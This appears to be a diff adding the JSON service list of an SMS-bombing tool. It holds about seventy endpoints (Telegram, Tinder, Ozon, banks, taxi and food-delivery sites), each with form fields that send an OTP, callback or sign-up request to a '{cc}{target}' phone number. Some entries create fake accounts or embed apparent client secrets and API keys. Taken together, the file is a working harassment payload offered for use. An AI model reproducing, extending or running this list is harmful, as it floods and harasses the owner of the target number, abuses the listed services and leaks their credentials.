@@ -1,0 +1,499 @@
+{
+    "sms": {
+        "telegram": {
+            "url": "https://my.telegram.org/auth/send_password",
+            "data": {
+                "phone": "+{cc}{target}"
+            }
+        },
+        "qiwi": {
+            "url": "https://mobile-api.qiwi.com/oauth/authorize",
+            "data": {
+                "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
+                "username": "{cc}{target}",
+                "client_id": "android-qw",
+                "client_secret": "zAm4FKq9UnSe7id"
+            }
+        },
+        "comfy": {
+            "url": "https://comfy.ua/ua/customer/account/createPost",
+            "data": {
+                "registration_name": "John",
+                "registration_phone": "{cc}{target}",
+                "registration_email": "john{cc}@gmail.com"
+            }
+        },
+        "3040": {
+            "url": "https://3040.com.ua/taxi-ordering",
+            "data": {
+                "callback-phone": "+{cc}{target}"
+            }
+        },
+        "alfalife": {
+            "url": "https://alfalife.cc/auth.php",
+            "data": {
+                "phone": "+{cc}{target}"
+            }
+        },
+        "allo": {
+            "url": "https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA",
+            "data": {
+                "firstname": "Jonhy",
+                "telephone": "{cc}{target}",
+                "email": "john{cc}@gmail.com",
+                "password": "Ped_ro49000",
+                "form_key": "Zqqj7CyjkKG2ImM8"
+            }
+        },
+        "citilink": {
+            "url": "https://www.citilink.ru/registration/confirm/phone/+{cc}{target}/"
+        },
+        "sportmaster": {
+            "url": "https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{cc}{target}"
+        },
+        "online": {
+            "url": "https://secure.online.ua/ajax/check_phone/?reg_phone={cc}{target}"
+        },
+        "pampik": {
+            "url": "https://pampik.com/callback",
+            "data": {
+                "phoneCallback": "{cc}{target}"
+            }
+        },
+        "dianet": {
+            "url": "https://my.dianet.com.ua/send_sms/",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "easypay": {
+            "url": "https://api.easypay.ua/api/auth/register",
+            "data": {
+                "phone": "{cc}{target}",
+                "password": "PeD_ro39000"
+            }
+        },
+        "edostav": {
+            "url": "https://vladimir.edostav.ru/site/CheckAuthLogin",
+            "data": {
+                "phone_or_email": "+{cc}{target}"
+            }
+        },
+        "etm": {
+            "url": "https://www.etm.ru/cat/runprog.html",
+            "data": {
+                "m_phone": "{cc}{target}",
+                "mode": "sendSms",
+                "syf_prog": "clients-services",
+                "getSysParam": "yes"
+            }
+        },
+        "finam": {
+            "url": "https://www.finam.ru/api/smslocker/sendcode",
+            "data": {
+                "phone": "+{cc}{target}"
+            }
+        },
+        "foodband": {
+            "url": "https://foodband.ru/api?phone={cc}{target}&call=customers/sendVerificationCode&g-recaptcha-response="
+        },
+        "hatimaki": {
+            "url": "https://www.hatimaki.ru/register/",
+            "data": {
+                "REGISTER[LOGIN]": "{cc}{target}",
+                "REGISTER[PERSONAL_PHONE]": "{cc}{target}",
+                "REGISTER[SMS_CODE]": "",
+                "resend-sms": "1",
+                "REGISTER[EMAIL]": "john{cc}@gmail.com",
+                "register_submit_button": "Зарегистрироваться"
+            }
+        },
+        "indriverapp": {
+            "url": "https://terra-1.indriverapp.com/api/authorization?locale=ru",
+            "data": {
+                "phone": "+{cc}{target}",
+                "mode": "request",
+                "phone_permission": "unknown",
+                "stream_id": 0,
+                "v": 3,
+                "appversion": "3.20.6",
+                "osversion": "unknown",
+                "devicemodel": "unknown"
+            }
+        },
+        "informatics": {
+            "url": "https://informatics.yandex/api/v1/registration/confirmation/phone/send/",
+            "data": {
+                "phone": "{cc}{target}",
+                "csrfmiddlewaretoken": "",
+                "country": {
+                    "7": "RU",
+                    "380": "UA",
+                    "375": "BE"
+                }
+            }
+        },
+        "izi": {
+            "url": "https://izi.ua/api/auth/register",
+            "json": {
+                "phone": "+{cc}{target}",
+                "name": "John",
+                "is_terms_accepted": true
+            }
+        },
+        "kaspi": {
+            "url": "https://kaspi.kz/util/send-app-link",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "koronapay": {
+            "url": "https://koronapay.com/transfers/online/api/users/otps",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "loany": {
+            "url": "https://loany.com.ua/funct/ajax/registration/code",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "makarolls": {
+            "url": "https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",
+            "data": {
+                "phone": "{cc}{target}",
+                "metod": "postreg"
+            }
+        },
+        "menu": {
+            "url": "https://www.menu.ua/kiev/delivery/registration/direct-registration.html",
+            "data": {
+                "user_info[phone]": "{cc}{target}",
+                "user_info[fullname]": "John",
+                "user_info[email]": "john{cc}@gmail.com",
+                "user_info[password]": "ndD34f!dfg#",
+                "user_info[conf_password]": "ndD34f!dfg#"
+            }
+        },
+        "menu_v2": {
+            "url": "https://www.menu.ua/kiev/delivery/profile/show-verify.html",
+            "data": {
+                "phone": "{cc}{target}",
+                "do": "phone"
+            }
+        },
+        "pizza": {
+            "url": "https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",
+            "data": {
+                "phone": "{cc}{target}",
+                "name": "John"
+            }
+        },
+        "moyo": {
+            "url": "https://www.moyo.ua/identity/registration",
+            "data": {
+                "phone": "{cc}{target}",
+                "firstname": "John",
+                "email": "john{cc}@gmail.com"
+            }
+        },
+        "tvh": {
+            "url": "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code?msisdn={cc}{target}"
+        },
+        "mygames": {
+            "url": "https://account.my.games/signup_send_sms/",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "prosushi": {
+            "url": "https://www.prosushi.ru/php/profile.php",
+            "data": {
+                "phone": "+{cc}{target}",
+                "mode": "sms"
+            }
+        },
+        "qlean": {
+            "url": "https://sso.cloud.qlean.ru/http/users/requestotp?phone={cc}{target}&clientId=undefined&sessionId=4224",
+            "headers": {
+                "Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"
+            }
+        },
+        "richfamily": {
+            "url": "https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",
+            "data": {
+                "phone": "+{cc}{target}"
+            }
+        },
+        "rieltor": {
+            "url": "https://rieltor.ua/api/users/register-sms/",
+            "data": {
+                "phone": "{cc}{target}",
+                "retry": 0
+            }
+        },
+        "rutaxi": {
+            "url": "https://rutaxi.ru/ajax_auth.html",
+            "data": {
+                "1": "{cc}{target}",
+                "c": "3"
+            }
+        },
+        "shopandshow": {
+            "url": "https://shopandshow.ru/sms/password-request/",
+            "data": {
+                "phone": "+{cc}{target}",
+                "resend": 0
+            }
+        },
+        "tabris": {
+            "url": "https://lk.tabris.ru/reg/",
+            "data": {
+                "phone": "{cc}{target}",
+                "action": "phone"
+            }
+        },
+        "taxi-ritm": {
+            "url": "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
+            "data": {
+                "BACK_CALL_PHONE": "{cc}{target}",
+                "RECALL": "Y"
+            }
+        },
+        "tvoyaapteka": {
+            "url": "https://www.tvoyaapteka.ru/bitrix/ajax/form_user_new.php?confirm_register=1",
+            "data": {
+                "phone": "+{cc}{target}",
+                "change_code": 1
+            }
+        },
+        "uklon": {
+            "url": "https://uklon.com.ua/api/v1/account/code/send",
+            "json": {
+                "phone": "{cc}{target}"
+            },
+            "headers": {
+                "client_id": "6289de851fc726f887af8d5d7a56c635"
+            }
+        },
+        "visa": {
+            "url": "https://pay.visa.ru/api/Auth/code/request",
+            "data": {
+                "phoneNumber": "+{cc}{target}"
+            }
+        },
+        "vsk": {
+            "url": "https://shop.vsk.ru/ajax/auth/postSms/",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "iconjob": {
+            "url": "https://api.iconjob.co/api/auth/verification_code",
+            "json": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "cloudloyalty": {
+            "url": "https://app.cloudloyalty.ru/demo/send-code",
+            "json": {
+                "country": 2,
+                "phone": "{cc}{target}",
+                "roistatVisit": 47637,
+                "experiments": {
+                    "new_header_title": "1"
+                }
+            }
+        },
+        "mtstv": {
+            "url": "https://api.mtstv.ru/v1/users",
+            "json": {
+                "msisdn": "{cc}{target}"
+            }
+        },
+        "tehnosvit": {
+            "url": "https://tehnosvit.ua/iwantring_feedback.html",
+            "data": {
+                "feedbackName": "Johnny",
+                "feedbackPhone": "+{cc}{target}"
+            }
+        },
+        "rutaxi_v2": {
+            "url": "https://moscow.rutaxi.ru/ajax_keycode.html",
+            "data": {
+                "1": "{cc}{target}"
+            }
+        },
+        "tinkoff": {
+            "url": "https://api.tinkoff.ru/v1/sign_up",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "youla": {
+            "url": "https://youla.ru/web-api/auth/request_code",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "invitro_v2": {
+            "url": "https://lk.invitro.ru/lk2/lka/patient/refreshCode",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "karusel": {
+            "url": "https://app.karusel.ru/api/v1/phone/",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "kfc": {
+            "url": "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
+            "json": {
+                "phone": "+{cc}{target}"
+            }
+        },
+        "icq": {
+            "url": "https://www.icq.com/smsreg/requestPhoneValidation.php",
+            "data": {
+                "msisdn": "{cc}{target}",
+                "locale": "en",
+                "countryCode": "ru",
+                "version": "1",
+                "k": "ic1rtwz1s1Hj1O0r",
+                "r": "46763"
+            }
+        },
+        "ivi": {
+            "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "mail": {
+            "url": "https://cloud.mail.ru/api/v2/notify/applink",
+            "json": {
+                "phone": "+{cc}{target}",
+                "api": 2,
+                "email": "email",
+                "x-email": "x-email"
+            }
+        },
+        "gotinder": {
+            "url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
+            "data": {
+                "phone_number": "{cc}{target}"
+            }
+        },
+        "wi-fi": {
+            "url": "https://cabinet.wi-fi.ru/api/auth/by-sms",
+            "data": {
+                "msisdn": "{cc}{target}"
+            },
+            "headers": {
+                "App-ID": "cabinet"
+            }
+        },
+        "alpari": {
+            "url": "https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
+            "json": {
+                "mobile_phone": "{cc}{target}",
+                "email": "john{cc}@gmail.com",
+                "client_type": "personal",
+                "deliveryOption": "sms"
+            },
+            "headers": {
+                "Referrer": "https://alpari.com/en/registration/"
+            }
+        },
+        "anytime": {
+            "url": "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "benzube": {
+            "url": "https://app.benzuber.ru/login",
+            "data": {
+                "phone": "+{cc}{target}"
+            }
+        },
+        "bamper": {
+            "url": "https://bamper.by/registration/?step=1",
+            "data": {
+                "phone": "+{cc}{target}",
+                "submit": "Запросить смс подтверждения",
+                "rules": "on"
+            }
+        },
+        "e-vse": {
+            "url": "https://e-vse.online/mail2.php",
+            "data": {
+                "object": "callback",
+                "user_name": "John",
+                "contact_phone": "+{cc}{target}"
+            }
+        },
+        "eda": {
+            "url": "https://eda.yandex/api/v1/user/request_authentication_code",
+            "json": {
+                "phone_number": "+{cc}{target}"
+            }
+        },
+        "chef": {
+            "url": "https://api.chef.yandex/api/v2/auth/sms",
+            "json": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "sunlight": {
+            "url": "https://api.sunlight.net/v3/customers/authorization/",
+            "data": {
+                "phone": "{cc}{target}"
+            }
+        },
+        "sipnet": {
+            "url": "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?phone=+{cc}{target}&callmode=1&oper=9"
+        },
+        "ozon": {
+            "url": "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
+            "json": {
+                "phone": "{cc}{target}",
+                "otpId": 0
+            }
+        },
+        "ok": {
+            "url": "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
+            "data": {
+                "st.r.phone": "+{cc}{target}"
+            }
+        },
+        "lenta": {
+            "url": "https://lenta.com/api/v1/authentication/requestValidationCode",
+            "json": {
+                "phone": "+{cc}{target}"
+            }
+        },
+        "guru": {
+            "url": "https://guru.taxi/api/v1/driver/session/verify",
+            "json": {
+                "phone": {
+                    "code": 1,
+                    "number": "{cc}{target}"
+                }
+            }
+        },
+        "findclone": {
+            "url": "https://findclone.ru/register?phone=+{cc}{target}"
+        },
+        "delitime": {
+            "url": "https://api.delitime.ru/api/v2/signup",
+            "data": {
+                "SignupForm[username]": "{cc}{target}",
+                "SignupForm[device_type]": 3
+            }
+        }
+    }
+}
